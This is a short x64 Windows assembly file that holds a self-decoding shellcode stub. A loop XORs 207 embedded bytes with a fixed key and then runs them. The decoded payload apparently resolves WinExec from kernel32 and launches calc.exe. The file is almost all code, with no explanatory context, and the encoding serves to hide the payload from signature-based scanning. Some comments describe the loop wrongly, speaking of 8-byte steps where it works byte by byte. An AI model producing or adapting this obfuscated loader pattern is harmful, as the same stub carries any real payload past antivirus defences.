;nasm -fwin64 [x64findkernel32.asm]
;ld -m i386pep -o x64findkernel32.exe x64findkernel32.obj
BITS 64

section .text
global main

main:
    ; Address of encoded shellcode
	xor rcx, rcx
        lea rsi, [rel encoded_shellcode-0x22222222]
	add rsi, 0x22222222
	mov rbx, rsi
	lea rsi, [rsi] ; Load effective address of shellcode into RSI
        mov cl, 207          ; Set RCX as the length of the encoded shellcode
        mov al, 0xAC                  ; Load XOR key into RAX (64-bit)

decode_loop:
    xor byte [rsi], al               ; XOR 1 byte at a time
    inc rsi                          ; Move to the next 8 bytes
    dec rcx                          ; Decrement the remaining length by 8
    jnz decode_loop                  ; Repeat until RCX is zero

encoded_shellcode:
; Embedded encoded shellcode
db 0xe4,0x2f,0x40,0x84,0xe4,0x2f,0x48,0x5c,0xe4,0x9d,0x65,0xc9,0xe4,0x27,0xed,0xcc,0xe4,0x27,0xec,0xb4,0xe4,0x27,0xdc,0xbc,0xe4,0x27,0x9a,0xe4,0x27,0x9a,0xe4,0x27,0xf2,0x9c,0xe5,0x25,0x74,0x27,0xf7,0x90,0xe0,0xad,0x6f,0xe4,0x9d,0x65,0xca,0x2d,0x6d,0x53,0x24,0xe4,0x6d,0x45,0xa4,0x27,0xb8,0xa7,0xe0,0xad,0x6e,0xe8,0x27,0xfe,0xb8,0xe1,0x9d,0x77,0xe8,0x27,0xf6,0x8c,0xe1,0xad,0x6f,0xe0,0x25,0x7d,0xe4,0x14,0xfb,0xc5,0xc2,0xe9,0xd4,0xc9,0xcf,0x3c,0xe4,0x6d,0x4c,0xa4,0xe4,0x6d,0x44,0xa4,0xfc,0xe4,0x25,0x4c,0xe4,0x2f,0x68,0xa4,0xcb,0x4f,0xbb,0x9d,0x77,0xed,0x27,0xf0,0x27,0xa8,0xe0,0xad,0x6f,0xe4,0x53,0x65,0xe0,0x27,0xa4,0xe0,0x95,0xa7,0xd8,0xaf,0xd9,0x4a,0x60,0xfd,0xed,0xf3,0xe0,0x25,0x55,0xe1,0x9d,0x77,0xe8,0x27,0xf6,0x88,0xe1,0xad,0x6f,0xe4,0x53,0x6d,0xca,0xe9,0x27,0x80,0xe7,0xe1,0x9d,0x77,0xe8,0x27,0xf6,0xb0,0xe1,0xad,0x6f,0xef,0x27,0xe8,0x07,0xa8,0xe0,0xad,0x6c,0xfc,0xed,0xf3,0xe4,0x9d,0x6c,0xfc,0xe4,0x14,0xcf,0xcd,0xc0,0xcf,0x82,0xc9,0xd4,0xc9,0xfc,0xe4,0x25,0x4d,0xe4,0x9d,0x7e,0xe4,0x53,0x6e,0xe4,0x2f,0x40,0x9c,0xed,0x53,0x7b

